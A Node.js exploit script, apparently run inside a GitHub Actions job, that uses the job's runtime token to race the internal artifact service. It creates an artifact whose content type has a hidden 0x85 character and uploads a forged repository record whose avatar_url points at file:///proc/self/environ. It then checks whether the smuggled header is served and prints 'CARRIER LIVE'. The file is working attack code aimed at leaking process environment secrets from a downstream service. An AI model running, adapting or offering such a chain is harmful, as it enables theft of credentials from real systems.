// Build ONE persistent carrier artifact (competitor's v6/v7 approach), make it
// self-referential, and report everything needed to fire it at a live instance
// PLUS the decisive check: does the served Content-Type carry 0x85?
import crypto from 'node:crypto';
import https from 'node:https';

const RESULTS = process.env.ACTIONS_RESULTS_URL;
const RT = process.env.ACTIONS_RUNTIME_TOKEN;
const GH = process.env.GH_TOKEN;
const REPO = process.env.GITHUB_REPOSITORY;
const claims = JSON.parse(Buffer.from(RT.split('.')[1], 'base64url').toString());
const scope = String(claims.scp || '').split(' ').find(s => s.startsWith('Actions.Results:'));
const [, runId, jobId] = scope.split(':');

const WEIRD = '\u0085application/json';
const CLEAN = 'application/json';

function twirp(method, body) {
  return fetch(`${RESULTS.replace(/\/?$/, '/')}twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
    method: 'POST', headers: { Authorization: `Bearer ${RT}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body) }).then(async r => ({ status: r.status, text: await r.text() }));
}
function put(url, data) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = https.request({ method: 'PUT', hostname: u.hostname, path: u.pathname + u.search,
      headers: { 'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2021-08-06',
                 'x-ms-blob-content-type': WEIRD, 'Content-Length': Buffer.byteLength(data) } },
      res => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
    req.on('error', reject); req.write(data); req.end();
  });
}
const create = (name, v, m) => twirp('CreateArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version: v, mime_type: m });
const finalize = (name, bytes) => twirp('FinalizeArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name,
  size: String(bytes.length), hash: `sha256:${crypto.createHash('sha256').update(bytes).digest('hex')}` });
function restDownload(id) {
  return new Promise(resolve => {
    https.request({ method: 'GET', hostname: 'api.github.com', path: `/repos/${REPO}/actions/artifacts/${id}/zip`,
      headers: { Accept: 'application/vnd.github.v3+json', Authorization: `Bearer ${GH}`, 'User-Agent': 'carrier' } },
      res => { res.resume();
        const loc = res.headers.location; if (!loc) return resolve({ noloc: res.statusCode });
        const u = new URL(loc); const rsct = (u.search.match(/[?&]rsct=([^&]*)/) || [])[1] || '';
        https.get({ hostname: u.hostname, path: u.pathname + u.search, headers: { 'User-Agent': 'carrier' } }, r2 => {
          const c = []; r2.on('data', x => c.push(x));
          r2.on('end', () => { const body = Buffer.concat(c); const ct = r2.headers['content-type'] || '';
            resolve({ rsct, ct, ctHex: Buffer.from(ct, 'latin1').toString('hex'), nel: Buffer.from(ct, 'latin1').includes(0x85),
                      bodyLen: body.length, bodyB64: body.toString('base64') }); });
        }).on('error', e => resolve({ rsct, err: String(e) }));
      }).on('error', e => resolve({ err: String(e) })).end();
  });
}

const name = `carrier-${Date.now()}`;
const created = await Promise.all([create(name, 6, WEIRD), create(name, 7, CLEAN)]);
const sas = created.map(c => { try { return JSON.parse(c.text).signed_upload_url; } catch { return null; } });
const ph = Buffer.from('{"probe":"ph"}');
await Promise.all(sas.map(s => put(s, ph)));
const f = await Promise.allSettled([finalize(name, ph), finalize(name, ph)]);
const ids = [...new Set(f.filter(x => x.status === 'fulfilled' && x.value.status === 200).map(x => JSON.parse(x.value.text).artifact_id))];
const id = ids.at(-1);
const repository = `${REPO}/actions/artifacts/${id}/zip`;
const body = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
  description: 'carrier', stargazers_count: 0,
}));
await Promise.all(sas.map(s => put(s, body)));
// re-finalize so recorded size/hash match the real body
await Promise.allSettled([finalize(name, body), finalize(name, body)]);
await new Promise(r => setTimeout(r, 1500));
const d = await restDownload(id);
console.log('ARTIFACT_ID ' + id);
console.log('ALL_IDS ' + JSON.stringify(ids));
console.log('REPOSITORY ' + repository);
console.log('BODY_B64 ' + body.toString('base64'));
console.log('BODY_SHA256 ' + crypto.createHash('sha256').update(body).digest('hex'));
console.log('SERVED ' + JSON.stringify(d));
console.log(d.nel ? '*** SERVED CT HAS 0x85 — CARRIER LIVE ***' : '### SERVED CT HAS NO 0x85 — will fail Gate A ###');
